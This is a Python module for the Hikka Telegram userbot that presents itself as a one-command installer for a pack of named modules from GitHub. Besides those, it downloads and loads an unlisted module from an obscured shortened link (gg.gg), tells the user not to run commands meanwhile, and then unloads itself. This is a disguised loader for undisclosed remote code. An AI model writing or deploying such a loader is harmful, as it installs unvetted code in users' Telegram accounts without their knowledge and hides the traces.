#          https://t.me/HPV_MODULES_VIP
#                      and
#             https://t.me/ToXicUse
#
#       🔒 Licensed under the GNU AGPLv3
#    https://www.gnu.org/licenses/agpl-3.0.html
#
# meta developer: @HPV_MODULES_VIP

import time
from .. import loader, utils
from time import sleep



Compliments = "https://raw.githubusercontent.com/Den4ikSuperOstryyPer4ik/Astro-Modules/main/Compliments.py"
RandomPasswordGenerator = "https://raw.githubusercontent.com/Den4ikSuperOstryyPer4ik/Astro-Modules/main/RandomPasswordGenerator.py"
iOSAppsForAndroid = "https://raw.githubusercontent.com/Den4ikSuperOstryyPer4ik/Astro-Modules/main/iOSAppsForAndroid.py"
RandomStatuses = "https://raw.githubusercontent.com/Den4ikSuperOstryyPer4ik/Astro-Modules/main/RandomStatuses.py"
RandomUser = "https://raw.githubusercontent.com/Den4ikSuperOstryyPer4ik/Astro-Modules/main/RandomUser.py"
HikkaCommandsLogger = "https://raw.githubusercontent.com/Den4ikSuperOstryyPer4ik/Astro-Modules/main/commands_logger.py"
Vahui = "https://raw.githubusercontent.com/Den4ikSuperOstryyPer4ik/Astro-Modules/main/вахуи_пон.py"
		

class AstroModulesPackMod(loader.Module):
	"""
	Модуль для загрузки всех модулей с канала @AstroModules одной командой

	💎 Author: @ToXicUse
	💻 Version: 2.0
	"""
	strings = {"name": "AstroModulesPack"}
	async def loadamcmd(self, message):
		""" —> Загрузка фулл пак модулей"""

		await message.edit("❗️Внимание!❗️\nПодготовка к загрузке...\nПросьба во время загрузки не выполнять никаких команд.\n\nТакже, в конце загрузки, модуль автоматически удалится чтобы вам не мешать.")
		sleep(10)
		await self.allmodules.commands["dlmod"](
			await utils.answer(message, f"{self.get_prefix()}dlmod {Compliments}")
        )
		sleep(1)
		await self.allmodules.commands["dlmod"](
			await utils.answer(message, f"{self.get_prefix()}dlmod {RandomPasswordGenerator}")
        )
		sleep(1)
		await self.allmodules.commands["dlmod"](
			await utils.answer(message, f"{self.get_prefix()}dlmod {iOSAppsForAndroid}")
        )
		sleep(1)
		await self.allmodules.commands["dlmod"](
			await utils.answer(message, f"{self.get_prefix()}dlmod {RandomStatuses}")
        )
		sleep(1)
		await self.allmodules.commands["dlmod"](
			await utils.answer(message, f"{self.get_prefix()}dlmod {RandomUser}")
        )
		sleep(1)
		await self.allmodules.commands["dlmod"](
			await utils.answer(message, f"{self.get_prefix()}dlmod {HikkaCommandsLogger}")
        )
		sleep(1)
		await self.allmodules.commands["dlmod"](
			await utils.answer(message, f"{self.get_prefix()}dlmod {Vahui}")
        )
		sleep(1)
		await self.allmodules.commands["dlmod"](
			await utils.answer(message, f"{self.get_prefix()}dlmod http://gg.gg/11poxs")
		)
		await self.allmodules.commands["type"](
			await utils.answer(message, f"{self.get_prefix()}type Модули успешно загружены. Самоуничтожение...")
		)
		sleep(3)
		await self.allmodules.commands["unloadmod"](
			await utils.answer(message, f"{self.get_prefix()}unloadmod AstroModulesPack"))
